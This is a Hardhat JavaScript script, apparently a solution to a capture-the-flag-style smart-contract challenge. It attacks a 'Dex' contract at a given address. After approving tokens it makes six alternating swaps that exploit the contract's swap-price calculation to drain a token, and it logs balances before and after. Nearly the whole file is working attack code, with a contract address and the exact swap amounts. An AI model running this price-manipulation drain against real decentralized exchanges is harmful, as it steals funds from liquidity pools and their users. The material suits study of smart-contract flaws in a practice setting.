const hre = require("hardhat");

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("Dex");
  const victim = await Victim.attach(
    "0xAe93a952f85BE151413582123b2d583f8D5dDBe4" // This is the contract address that you get from starting your instance
  );

  // Get token addresses to make it more readable
  t1 = await victim.token1();
  t2 = await victim.token2();

  // Check the initial balance of token 1 and token 2 in the contract
  const value1 = await victim.balanceOf(t1, victim.address);
  console.log("The value of token 1 in the contract is ", value1.toString());
  const value2 = await victim.balanceOf(t2, victim.address);
  console.log("The value of token 2 in the contract is ", value2.toString());

  // Check your initial balance of token 1 and token 2 in the contract
  const wallet = process.env.PUBLIC_KEY;
  const value3 = await victim.balanceOf(t1, wallet);
  console.log("Your balance of token 1 in the contract is ", value3.toString());
  const value4 = await victim.balanceOf(t2, wallet);
  console.log("Your balance of token 2 in the contract is ", value4.toString());

  // Call the approve function to be able to swap
  const approve1 = await victim.approve(victim.address, 500);
  await approve1.wait(1);

  // First swap
  const attack1 = await victim.swap(t1, t2, 10);
  await attack1.wait(1);

  // Check your balance of token 1 and token 2 in the contract
  const value5 = await victim.balanceOf(t1, wallet);
  console.log("Your balance of token 1 in the contract is ", value5.toString());
  const value6 = await victim.balanceOf(t2, wallet);
  console.log("Your balance of token 2 in the contract is ", value6.toString());

  // Second swap
  const attack2 = await victim.swap(t2, t1, 20);
  await attack2.wait(1);

  // Third swap
  const attack3 = await victim.swap(t1, t2, 24);
  await attack3.wait(1);

  // Fourth swap
  const attack4 = await victim.swap(t2, t1, 30);
  await attack4.wait(1);

  // Fifth swap
  const attack5 = await victim.swap(t1, t2, 41);
  await attack5.wait(1);

  // Sixth swap
  const attack6 = await victim.swap(t2, t1, 45);
  await attack6.wait(1);

  // Check the final balance of token 1 and token 2 in the contract
  const value7 = await victim.balanceOf(t1, victim.address);
  console.log("The value of token 1 in the contract is ", value7.toString());
  const value8 = await victim.balanceOf(t2, victim.address);
  console.log("The value of token 2 in the contract is ", value8.toString());

  // Check your final balance of token 1 and token 2 in the contract
  const value9 = await victim.balanceOf(t1, wallet);
  console.log("Your balance of token 1 in the contract is ", value9.toString());
  const value10 = await victim.balanceOf(t2, wallet);
  console.log("Your balance of token 2 is ", value10.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
